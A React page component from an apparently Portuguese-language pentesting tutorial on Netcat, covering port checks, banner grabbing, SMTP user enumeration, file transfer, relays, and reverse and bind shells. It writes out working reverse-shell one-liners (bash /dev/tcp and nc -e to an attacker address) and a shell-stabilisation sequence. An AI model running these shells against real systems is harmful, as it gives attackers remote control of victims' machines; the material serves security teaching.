import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Netcat() {
    return (
      <PageContainer
        title="Netcat — O Canivete Suíço das Redes"
        subtitle="Ferramenta fundamental para ler e escrever dados em conexões TCP/UDP, criar shells reversos e transferir arquivos."
        difficulty="intermediario"
        timeToRead="12 min"
      >
        <AlertBox type="info" title="Ferramenta essencial para pentesters">
          Netcat (nc) é uma das ferramentas mais versáteis do arsenal de segurança.
          Simples, poderosa e disponível em quase qualquer sistema Unix/Linux.
          No Kali, use <code>ncat</code> (versão melhorada do Nmap) ou <code>nc</code>.
        </AlertBox>

        <h2>Instalação</h2>
        <CodeBlock language="bash" code={'# Já disponível no Kali:\nwhich nc\nwhich ncat\n\n# nc tradicional:\nsudo apt install netcat-traditional -y\n\n# ncat (do Nmap, mais recursos):\nsudo apt install ncat -y'} />

        <h2>Verificar Portas e Conectividade</h2>
        <CodeBlock language="bash" code={'# Verificar se porta está aberta\nnc -zv 192.168.1.1 22\nnc -zv 192.168.1.1 80\n\n# Verificar múltiplas portas\nnc -zv 192.168.1.1 20-100\n\n# Verificar porta UDP\nnc -zvu 192.168.1.1 53\n\n# Timeout de conexão\nnc -zv -w 3 192.168.1.1 443\n\n# Script para varrer múltiplos hosts\nfor host in 192.168.1.{1..254}; do\n  nc -zv -w 1 $host 22 2>&1 | grep -v refused\ndone'} />

        <h2>Banner Grabbing</h2>
        <CodeBlock language="bash" code={'# Conectar e ver banner do serviço\nnc 192.168.1.1 21    # FTP\nnc 192.168.1.1 22    # SSH\nnc 192.168.1.1 25    # SMTP\nnc 192.168.1.1 80    # HTTP (envie manualmente: HEAD / HTTP/1.0 + ENTER)\n\n# HTTP banner grab\necho -e "HEAD / HTTP/1.0\\r\\n\\r\\n" | nc -w 3 192.168.1.1 80\n\n# SMTP enumeration\nnc 192.168.1.1 25\n> EHLO alvo.com\n> VRFY root        # verificar se usuário existe\n> VRFY admin'} />

        <h2>Shells Reversos (Reverse Shells)</h2>
        <CodeBlock language="bash" code={'# ATACANTE: escutar na porta 4444\nnc -lvnp 4444\n\n# VÍTIMA: conectar de volta ao atacante (bash)\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n\n# VÍTIMA: shell reverso com nc clássico\nnc 192.168.1.100 4444 -e /bin/bash\n\n# VÍTIMA: shell reverso com nc sem -e\nnc 192.168.1.100 4444 | /bin/bash | nc 192.168.1.100 4445\n\n# Estabilizar shell reverso recebido\n# (no atacante, após receber conexão)\npython3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Ctrl+Z\nstty raw -echo && fg\nexport TERM=xterm'} />

        <h2>Transferência de Arquivos</h2>
        <CodeBlock language="bash" code={'# RECEPTOR (esperar arquivo na porta 5555)\nnc -lvnp 5555 > arquivo_recebido.txt\n\n# EMISSOR (enviar arquivo)\nnc 192.168.1.100 5555 < arquivo_para_enviar.txt\n\n# Transferir diretório comprimido\n# RECEPTOR:\nnc -lvnp 5555 | tar xvf -\n\n# EMISSOR:\ntar cvf - /diretorio/ | nc 192.168.1.100 5555\n\n# Verificar integridade (com md5)\nmd5sum arquivo_recebido.txt'} />

        <h2>Bind Shell e Relay</h2>
        <CodeBlock language="bash" code={'# Bind Shell — ouvir na máquina alvo e se conectar\n# ALVO: abrir shell na porta 4444\nnc -lvnp 4444 -e /bin/bash\n\n# ATACANTE: conectar\nnc 192.168.1.50 4444\n\n# Relay / Port Forwarding simples\n# Redirecionar porta 8080 local para porta 80 de outro host\nmkfifo /tmp/pipe\nnc -lvnp 8080 < /tmp/pipe | nc 192.168.1.1 80 > /tmp/pipe'} />

        <AlertBox type="success" title="Alternativas modernas">
          Para shells reversos mais robustos, considere: <strong>socat</strong> (mais recursos),
          <strong>ncat</strong> (SSL nativo), <strong>pwncat</strong> (automação de pós-exploração).
        </AlertBox>
      </PageContainer>
    );
  }
  